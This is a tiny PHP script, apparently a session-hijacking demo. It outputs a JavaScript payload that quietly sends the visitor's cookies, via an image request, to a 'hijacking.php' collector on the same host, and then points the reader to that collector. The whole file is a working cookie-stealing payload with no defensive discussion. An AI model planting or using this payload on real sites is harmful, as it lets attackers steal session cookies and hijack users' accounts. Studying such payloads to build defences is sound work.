<?php

echo '<script>new Image().src="http://'.$_SERVER['HTTP_HOST'].'/hijacking.php?data="+document.cookie;</script>';

echo 'check http://'.$_SERVER['HTTP_HOST'].'/hijacking.php';